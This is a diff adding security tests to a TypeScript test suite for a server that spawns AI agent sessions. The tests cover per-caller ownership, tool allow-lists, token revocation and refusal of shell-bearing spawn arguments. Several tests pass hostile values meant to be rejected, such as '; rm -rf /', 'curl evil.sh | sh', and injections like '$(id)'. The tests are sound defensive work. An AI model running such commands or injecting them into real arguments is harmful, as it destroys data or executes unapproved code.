@@ -78,12 +78,22 @@ function makeDeps(state: { sessions: SessionRuntime[] }): DeckControlDeps & {
   acked: string[];
   approvals: SpawnSummary[][];
   spawnInputs: CreateSessionInput[];
+  restarted: string[];
+  leadMcpCalls: { token: string; callerId: string; allowedTools: readonly string[] }[];
+  revokedLeadCallerIds: string[];
 } {
   const closed: string[] = [];
   const removedWt: string[] = [];
   const acked: string[] = [];
   const approvals: SpawnSummary[][] = [];
   const spawnInputs: CreateSessionInput[] = [];
+  const restarted: string[] = [];
+  // Card 6c380073 audit fix #3: captures what spawnEntry ACTUALLY passes to
+  // writeTeamLeadMcpConfig, so a test can assert the real identity/scope
+  // instead of only the stub's fixed return value (the coverage gap the
+  // audit named -- the previous stub threw its args away entirely).
+  const leadMcpCalls: { token: string; callerId: string; allowedTools: readonly string[] }[] = [];
+  const revokedLeadCallerIds: string[] = [];
   let n = 0;
   return {
     closed,
@@ -91,6 +101,9 @@ function makeDeps(state: { sessions: SessionRuntime[] }): DeckControlDeps & {
     acked,
     approvals,
     spawnInputs,
+    restarted,
+    leadMcpCalls,
+    revokedLeadCallerIds,
     listAgents: () => ["team-lead", "dev", "reviewer"],
     listModels: () => [{ id: "opus", label: "Opus" }],
     listPresets: () => [],
@@ -107,7 +120,9 @@ function makeDeps(state: { sessions: SessionRuntime[] }): DeckControlDeps & {
       return s;
     },
     listSessions: () => state.sessions,
-    restartSession: () => undefined,
+    restartSession: (id) => {
+      restarted.push(id);
+    },
     closeSession: (id) => {
       closed.push(id);
       state.sessions = state.sessions.filter((s) => s.id !== id);
@@ -131,7 +146,22 @@ function makeDeps(state: { sessions: SessionRuntime[] }): DeckControlDeps & {
       acked.push(id);
     },
     writeEmbeddedPrompt: (id) => `/state/embedded-agent-${id}.md`,
-    writeTeamLeadMcpConfig: () => "/state/team-lead-mcp.json"
+    // Return value stays the OLD fixed string on purpose -- the pre-existing
+    // "embedded spawn" test below asserts this exact literal for TWO
+    // successive team-lead spawns. What changed is that the real
+    // (token, callerId, allowedTools) spawnEntry passes are now CAPTURED
+    // rather than discarded, so a caller can assert on them separately.
+    writeTeamLeadMcpConfig: (token, callerId, allowedTools) => {
+      leadMcpCalls.push({ token, callerId, allowedTools });
+      return "/state/team-lead-mcp.json";
+    },
+    revokeTeamLeadMcpConfig: (callerId) => {
+      revokedLeadCallerIds.push(callerId);
+    },
+    // Card 6c380073 audit fix #1c: unrestricted by default (mirrors "no
+    // shell-field gate in play" for tests not exercising it); tests below
+    // that DO care override this per-call.
+    confirmSpawnShellFields: () => true
   };
 }
 
@@ -225,6 +255,169 @@ test("guards: close/remove only touch supervisor-created objects; spawn cap", as
   expect(capped.body.error).toContain("spawn cap");
 });
 
+// ----- Card 6c380073: ownedSessions/ownedWorktrees keyed by CALLER, not by -----
+// "spawned through this endpoint" -- a second minted caller must not be able
+// to close, restart or touch a tile/worktree the first caller created, and
+// the server-side allow-list must bite at POST /call itself.
+
+test("mintCaller: a second caller cannot close nor restart a tile owned by the first caller", async () => {
+  const state = { sessions: [] as SessionRuntime[] };
+  const deps = makeDeps(state);
+  const srv = await startDeckControl(deps);
+  servers.push(srv);
+
+  // The legacy/supervisor token spawns and therefore owns a session.
+  const spawned = await call(srv, "deck_spawn_session", { name: "mine" });
+  const id = (spawned.body.result as { session: { id: string } }).session.id;
+
+  // A second, independently minted, UNRESTRICTED caller (allowedTools=null)
+  // is still refused: the allow-list and the ownership guard are two
+  // different dimensions, and this probes ownership specifically.
+  const other = srv.mintCaller("other-caller", null);
+  expect(other.token).not.toBe(srv.token);
+  expect(other.callerId).not.toBe("supervisor");
+
+  const closeRefused = await call(srv, "deck_close_session", { id }, other.token);
+  expect(closeRefused.status).toBe(400);
+  expect(closeRefused.body.error).toContain("refused");
+  expect(deps.closed).toEqual([]);
+
+  const restartRefused = await call(srv, "deck_restart_session", { id }, other.token);
+  expect(restartRefused.status).toBe(400);
+  expect(restartRefused.body.error).toContain("refused");
+  expect(deps.restarted).toEqual([]);
+
+  // Restarting/closing an id NEVER seen by this endpoint at all is refused
+  // the same way -- no branch falls back to a default owner.
+  const unknownId = await call(srv, "deck_restart_session", { id: "never-spawned" }, other.token);
+  expect(unknownId.status).toBe(400);
+  expect(unknownId.body.error).toContain("refused");
+
+  // The OWNING caller (the legacy token that actually spawned it) can do
+  // both -- restart was previously unguarded on ANY tile; now it enforces
+  // the same per-caller check deck_close_session already had.
+  const restartOk = await call(srv, "deck_restart_session", { id });
+  expect(restartOk.body.ok).toBe(true);
+  expect(deps.restarted).toEqual([id]);
+  const closeOk = await call(srv, "deck_close_session", { id });
+  expect(closeOk.body.ok).toBe(true);
+  expect(deps.closed).toEqual([id]);
+});
+
+test("mintCaller: a second caller cannot remove a worktree created by the first caller", async () => {
+  const state = { sessions: [] as SessionRuntime[] };
+  const deps = makeDeps(state);
+  const srv = await startDeckControl(deps);
+  servers.push(srv);
+
+  const created = await call(srv, "deck_create_worktree", { branch: "agent/mine" });
+  const path = (created.body.result as { worktree: { path: string } }).worktree.path;
+
+  const other = srv.mintCaller("other-caller", null);
+  const refused = await call(srv, "deck_remove_worktree", { path }, other.token);
+  expect(refused.status).toBe(400);
+  expect(refused.body.error).toContain("refused");
+  expect(deps.removedWt).toEqual([]);
+
+  const ok = await call(srv, "deck_remove_worktree", { path });
+  expect(ok.body.ok).toBe(true);
+  expect(deps.removedWt).toEqual([path]);
+});
+
+test("server-side allow-list refuses a disallowed tool AT POST /call, not just at tools/list", async () => {
+  const state = { sessions: [] as SessionRuntime[] };
+  const deps = makeDeps(state);
+  const srv = await startDeckControl(deps);
+  servers.push(srv);
+
+  const limited = srv.mintCaller("limited", ["deck_list_agents"]);
+
+  const allowed = await call(srv, "deck_list_agents", {}, limited.token);
+  expect(allowed.status).toBe(200);
+  expect(allowed.body.ok).toBe(true);
+
+  // A real, valid tool this caller simply isn't scoped for -- refused HERE,
+  // never reaching dispatch()/deps at all.
+  const refused = await call(srv, "deck_announce", { text: "hi" }, limited.token);
+  expect(refused.status).toBe(403);
+  expect(refused.body.error).toContain("deck_announce");
+  expect(deps.approvals).toEqual([]);
+
+  // An UNRESTRICTED caller (allowedTools=null, e.g. the legacy token) is
+  // unaffected by any other caller's narrower scope.
+  const unrestricted = await call(srv, "deck_announce", { text: "hi" });
+  expect(unrestricted.body.ok).toBe(true);
+});
+
+test("server-side allow-list: an explicit empty array grants zero tools, distinct from unset (null)", async () => {
+  const srv = await startDeckControl(makeDeps({ sessions: [] }));
+  servers.push(srv);
+
+  const zero = srv.mintCaller("zero", []);
+  const refused = await call(srv, "deck_list_agents", {}, zero.token);
+  expect(refused.status).toBe(403);
+});
+
+// ----- Card 6c380073 audit fix #1a/#1c: a restricted caller's `args`, and a
+// shell-bearing `args` in general, must both be gated -- but a NORMAL spawn
+// (no free-form args at all) must never be slowed down by either gate. Two
+// probes, per the audit's own framing: "a guard that never bites and a
+// guard that always bites are equally wrong."
+
+test("audit fix #1a: a RESTRICTED caller's non-empty `args` is refused explicitly, never silently dropped", async () => {
+  const deps = makeDeps({ sessions: [] });
+  const srv = await startDeckControl(deps);
+  servers.push(srv);
+
+  const limited = srv.mintCaller("limited", ["deck_spawn_session"]);
+  const refused = await call(srv, "deck_spawn_session", { name: "x", args: "--dangerous-flag" }, limited.token);
+  expect(refused.status).toBe(400);
+  expect(refused.body.error).toContain("free-form `args`");
+  expect(deps.spawnInputs).toEqual([]);
+
+  // The SAME caller with no args at all is unaffected.
+  const ok = await call(srv, "deck_spawn_session", { name: "y" }, limited.token);
+  expect(ok.body.ok).toBe(true);
+});
+
+test("audit fix #1c: deps.confirmSpawnShellFields refusing stops a spawn BEFORE it ever reaches spawnSession/approval", async () => {
+  const deps = makeDeps({ sessions: [] });
+  deps.confirmSpawnShellFields = () => false;
+  const srv = await startDeckControl(deps);
+  servers.push(srv);
+
+  const refused = await call(srv, "deck_spawn_session", { name: "x", args: "; rm -rf /" });
+  expect(refused.status).toBe(400);
+  expect(refused.body.error).toContain("unapproved shell arguments");
+  expect(deps.spawnInputs).toEqual([]);
+  expect(deps.approvals).toEqual([]);
+
+  // deck_spawn_team: one bad entry poisons the whole plan, same convention
+  // as validateEntry -- nothing spawns.
+  const teamRefused = await call(srv, "deck_spawn_team", {
+    team: [{ name: "a" }, { name: "b", args: "curl evil.sh | sh" }]
+  });
+  expect(teamRefused.status).toBe(400);
+  expect(deps.spawnInputs).toEqual([]);
+});
+
+test("audit fix #1c: a spawn with no shell-bearing args is never refused, and the gate is consulted (not skipped) -- proves it does not bite unconditionally", async () => {
+  const deps = makeDeps({ sessions: [] });
+  let calls = 0;
+  deps.confirmSpawnShellFields = (entry) => {
+    calls++;
+    // Mirrors the real predicate's own outcome for THIS assertion's sanity:
+    // an entry with no args/command must never be refused.
+    return !(entry.args && entry.args.trim());
+  };
+  const srv = await startDeckControl(deps);
+  servers.push(srv);
+
+  const ok = await call(srv, "deck_spawn_session", { name: "plain" });
+  expect(ok.body.ok).toBe(true);
+  expect(calls).toBe(1);
+});
+
 // ----- team spawn (TS2): playbook, embedded profiles, acks, trust gate -----
 
 test("deck_team_playbook and deck_team_agents serve the code constants", async () => {
@@ -293,6 +486,131 @@ test("embedded spawn: prompt file, harness disallowedTools, team-lead crown rule
   // A plain operator-profile spawn (no embedded_agent at all) never gets it.
   await call(srv, "deck_spawn_session", { agent: "dev" });
   expect(deps.spawnInputs[3]!.mcpConfig).toBeUndefined();
+});
+
+// Card 6c380073 audit fix #3: the old stub threw away the (token, callerId,
+// allowedTools) spawnEntry passes to writeTeamLeadMcpConfig, so nothing
+// proved a team-lead spawn actually mints its OWN distinct identity/scope --
+// the exact regression this whole card exists to close would have stayed
+// GREEN under the old mock. This proves it behaviorally: capture the real
+// token, then POST /call with it directly against the real dispatch.
+test("a team-lead spawn mints its OWN token/callerId (never the supervisor's), scoped to TEAM_LEAD_DECK_TOOLS", async () => {
+  const state = { sessions: [] as SessionRuntime[] };
+  const deps = makeDeps(state);
+  const srv = await startDeckControl(deps);
+  servers.push(srv);
+
+  await call(srv, "deck_spawn_session", { embedded_agent: "team-lead" });
+  await call(srv, "deck_spawn_session", { name: "another", embedded_agent: "team-lead" });
+  expect(deps.leadMcpCalls.length).toBe(2);
+
+  const [first, second] = deps.leadMcpCalls as [
+    { token: string; callerId: string; allowedTools: readonly string[] },
+    { token: string; callerId: string; allowedTools: readonly string[] }
+  ];
+  // Distinct from the supervisor's own token/callerId.
+  expect(first.token).not.toBe(srv.token);
+  // Distinct between the two successive lead spawns -- never reused.
+  expect(first.token).not.toBe(second.token);
+  expect(first.callerId).not.toBe(second.callerId);
+  // Scoped to exactly TEAM_LEAD_DECK_TOOLS -- the same array reference
+  // threaded to mintCaller, per audit fix #6.
+  expect([...first.allowedTools].sort()).toEqual([...TEAM_LEAD_DECK_TOOLS].sort());
+
+  // The identity is REAL, not just a returned string: POST /call with the
+  // captured token directly. An allowed tool reaches dispatch (200); a tool
+  // outside TEAM_LEAD_DECK_TOOLS is refused AT THE CALL (403).
+  const allowed = await call(srv, "deck_spawn_session", { name: "x" }, first.token);
+  expect(allowed.status).toBe(200);
+  expect(allowed.body.ok).toBe(true);
+
+  const refused = await call(srv, "deck_announce", { text: "hi" }, first.token);
+  expect(refused.status).toBe(403);
+});
+
+// Card 6c380073, review round 2 point 5(a): revokeCallerForSession was
+// exported, wired into index.ts's 'removed' listener, and proven by NOTHING --
+// the stub's revokedLeadCallerIds array was never asserted either. This is the
+// promise's own end-to-end proof: the lead's token works, then it does not.
+test("revokeCallerForSession kills the lead's token -- its next call 401s", async () => {
+  const state = { sessions: [] as SessionRuntime[] };
+  const deps = makeDeps(state);
+  const srv = await startDeckControl(deps);
+  servers.push(srv);
+
+  const created = await call(srv, "deck_spawn_session", { embedded_agent: "team-lead" });
+  const leadToken = deps.leadMcpCalls[0]!.token;
+  const sessionId = (created.body.result as { session: { id: string } }).session.id;
+
+  const before = await call(srv, "deck_spawn_session", { name: "before" }, leadToken);
+  expect(before.status).toBe(200);
+
+  expect(srv.revokeCallerForSession(sessionId)).not.toBe(null);
+
+  const after = await call(srv, "deck_spawn_session", { name: "after" }, leadToken);
+  expect(after.status).toBe(401);
+
+  // A session that never had a minted caller (or an already-revoked one) is a
+  // no-op, not an error -- index.ts calls this for EVERY removed tile.
+  expect(srv.revokeCallerForSession("no-such-id")).toBe(null);
+  expect(srv.revokeCallerForSession(sessionId)).toBe(null);
+});
+
+// Point 5(b): the spawn-failure rollback. The mint and the --mcp-config write
+// both happen BEFORE deps.spawnSession, so a throw there must undo both.
+test("a spawn that fails AFTER the mint revokes the token and deletes its config file", async () => {
+  const deps = makeDeps({ sessions: [] });
+  deps.spawnSession = async () => {
+    throw new Error("worktree creation blew up");
+  };
+  const srv = await startDeckControl(deps);
+  servers.push(srv);
+
+  const failed = await call(srv, "deck_spawn_session", { embedded_agent: "team-lead" });
+  expect(failed.status).toBe(400);
+  expect(failed.body.error).toContain("worktree creation blew up");
+
+  // A token WAS minted and a file WAS written before the failure...
+  expect(deps.leadMcpCalls.length).toBe(1);
+  const orphanedCallerId = deps.leadMcpCalls[0]!.callerId;
+  // ...and both were rolled back: the file deletion was requested for THAT
+  // callerId, and the token no longer authorizes anything.
+  expect(deps.revokedLeadCallerIds).toEqual([orphanedCallerId]);
+  const orphanedToken = deps.leadMcpCalls[0]!.token;
+  const afterRollback = await call(srv, "deck_list_agents", {}, orphanedToken);
+  expect(afterRollback.status).toBe(401);
+});
+
+// Card 6c380073, second audit round: `effort` reached the login-shell command
+// line unquoted and un-allow-listed. session-command.ts's effortFlag now
+// sanitizes it for every caller; this endpoint refuses it BY NAME so a calling
+// agent learns its argument was rejected instead of silently emptied.
+test("an effort outside the documented enum is refused by name, a valid one passes", async () => {
+  const deps = makeDeps({ sessions: [] });
+  const srv = await startDeckControl(deps);
+  servers.push(srv);
+
+  const hostile = await call(srv, "deck_spawn_session", { name: "x", effort: "low; touch /tmp/pwned" });
+  expect(hostile.status).toBe(400);
+  expect(hostile.body.error).toContain("is not a valid level");
+  expect(deps.spawnInputs).toEqual([]);
+  expect(deps.approvals).toEqual([]);
+
+  // A plausible-but-unlisted level is refused just the same (allow-list, not
+  // a metacharacter blacklist).
+  const unlisted = await call(srv, "deck_spawn_session", { name: "x", effort: "ultra" });
+  expect(unlisted.status).toBe(400);
+
+  const ok = await call(srv, "deck_spawn_session", { name: "y", effort: "xhigh" });
+  expect(ok.body.ok).toBe(true);
+  expect(deps.spawnInputs[0]!.effort).toBe("xhigh");
+
+  // deck_spawn_team validates every entry before any spawn, same as `cli`.
+  const team = await call(srv, "deck_spawn_team", {
+    team: [{ name: "a" }, { name: "b", effort: "$(id)" }]
+  });
+  expect(team.status).toBe(400);
+  expect(deps.spawnInputs.length).toBe(1); // only the earlier solo spawn
 });
 
 test("deck_spawn_session acks: sync peer_id by default, async when wait_for_peer=false", async () => {
@@ -425,13 +743,17 @@ test("writeTeamLeadMcpConfig writes its OWN file, scoped to TEAM_LEAD_DECK_TOOLS
     controlUrl: "http://127.0.0.1:1234",
     controlToken: "tok"
   });
-  const leadFile = writeTeamLeadMcpConfig({
-    dir,
-    mcpScriptPath: "/res/deck-plugin/mcp/deck-control-mcp.mjs",
-    execPath: "/usr/bin/electron",
-    controlUrl: "http://127.0.0.1:1234",
-    controlToken: "tok"
-  });
+  const leadFile = writeTeamLeadMcpConfig(
+    {
+      dir,
+      mcpScriptPath: "/res/deck-plugin/mcp/deck-control-mcp.mjs",
+      execPath: "/usr/bin/electron",
+      controlUrl: "http://127.0.0.1:1234",
+      controlToken: "tok"
+    },
+    "team-lead-mcp-test.json",
+    TEAM_LEAD_DECK_TOOLS
+  );
   // Distinct files: a live supervisor tile and a live team-lead tile must
   // never race-overwrite each other's --mcp-config.
   expect(leadFile).not.toBe(supFile);
@@ -751,4 +1073,101 @@ test("deck_list_sessions: sessionView's `thinking` field carries 'working'/'idle
   const sessions = (listed.body.result as { sessions: { id: string; thinking: string }[] }).sessions;
   const byId = Object.fromEntries(sessions.map((s) => [s.id, s.thinking]));
   expect(byId).toEqual({ a: "working", b: "idle", c: "unknown" });
+});
+
+// ----- Card 6c380073 audit fix #1c: hands-free must refuse an unapproved
+// shell-bearing spawn WITHOUT ever opening the (blocking) dialog. This
+// specific branch lives in index.ts's confirmSpawnShellFields, which is NOT
+// bun-test-importable (electron: `dialog`) -- same constraint
+// tests/desktop-inject-command-modal-guard.test.ts documents for
+// session-service.ts. Covered here by a source scan on the real file, same
+// convention, RED-proofed against synthetic bodies below. This is the WEAK
+// half of the #1c proof; the behavioral halves (the gate actually blocks a
+// spawn, and does not fire on a plain one) are the two tests above this
+// section, against the real deck-control.ts dispatch.
+
+const INDEX_TS_PATH = join(import.meta.dir, "..", "desktop", "src", "main", "index.ts");
+
+function extractBracedBody(src: string, openIdx: number): string {
+  let depth = 1;
+  let i = openIdx + 1;
+  while (depth > 0 && i < src.length) {
+    if (src[i] === "{") depth++;
+    else if (src[i] === "}") depth--;
+    i++;
+  }
+  return src.slice(openIdx + 1, i - 1);
+}
+
+function extractConfirmSpawnShellFieldsBody(src: string): string {
+  const fnMatch =
+    /const confirmSpawnShellFields = \(entry: \{ command\?: string; args\?: string \}\): boolean => \{/.exec(
+      src
+    );
+  if (!fnMatch) {
+    throw new Error(
+      "confirmSpawnShellFields not found in index.ts with its expected signature -- has it been renamed?"
+    );
+  }
+  return extractBracedBody(src, fnMatch.index + fnMatch[0].length - 1);
+}
+
+const HANDS_FREE_CHECK = /supervisorSpawnMode\s*===\s*'hands-free'/;
+const DIALOG_GATE_CALL = /confirmShellFieldApproval\(/;
+
+/**
+ * WEAK by design (see the block comment above): only proves the hands-free
+ * check appears BEFORE the dialog-opening call textually, and that a
+ * `return false` exists in that same preceding slice (the refusal). Cannot,
+ * by source scan alone, prove the cache lookup itself is correct -- that is
+ * covered by launch-approval.ts's own isApproved/approve tests.
+ */
+function handsFreeRefusesBeforeDialog(body: string): boolean {
+  const handsFreeIdx = body.search(HANDS_FREE_CHECK);
+  if (handsFreeIdx === -1) return false;
+  const dialogIdx = body.search(DIALOG_GATE_CALL);
+  if (dialogIdx === -1) return false;
+  if (handsFreeIdx > dialogIdx) return false;
+  const handsFreeBranch = body.slice(handsFreeIdx, dialogIdx);
+  return /return false/.test(handsFreeBranch);
+}
+
+test("confirmSpawnShellFields refuses BEFORE opening the dialog in hands-free mode (real file)", () => {
+  const body = extractConfirmSpawnShellFieldsBody(readFileSync(INDEX_TS_PATH, "utf-8"));
+  expect(handsFreeRefusesBeforeDialog(body)).toBe(true);
+});
+
+// RED-proof: the checker itself, against synthetic bodies -- immune to
+// source drift in index.ts.
+
+test("the checker REJECTS a body that opens the dialog unconditionally (no hands-free branch at all)", () => {
+  const noHandsFree = `
+    if (!sessionsHaveShellFields([entry])) return true
+    return confirmShellFieldApproval({ keyPart: 'deck-spawn' })
+  `;
+  expect(handsFreeRefusesBeforeDialog(noHandsFree)).toBe(false);
+});
+
+test("the checker REJECTS a body where the hands-free branch does NOT refuse (falls through to the dialog anyway)", () => {
+  const fallsThrough = `
+    if (!sessionsHaveShellFields([entry])) return true
+    if (getConfig().supervisorSpawnMode === 'hands-free') {
+      journal.add('session', 'note only, no refusal')
+    }
+    return confirmShellFieldApproval({ keyPart: 'deck-spawn' })
+  `;
+  expect(handsFreeRefusesBeforeDialog(fallsThrough)).toBe(false);
+});
+
+test("the checker ACCEPTS the new shape (hands-free checked and refuses BEFORE the dialog call)", () => {
+  const newBody = `
+    if (!sessionsHaveShellFields([entry])) return true
+    if (getConfig().supervisorSpawnMode === 'hands-free') {
+      if (isApproved(approvalsFile(), key, JSON.stringify(hashPayload))) return true
+      journal.add('session', 'refused')
+      return false
+    }
+    return confirmShellFieldApproval({ keyPart: 'deck-spawn' })
+  `;
+  expect(handsFreeRefusesBeforeDialog(newBody)).toBe(true);
 });
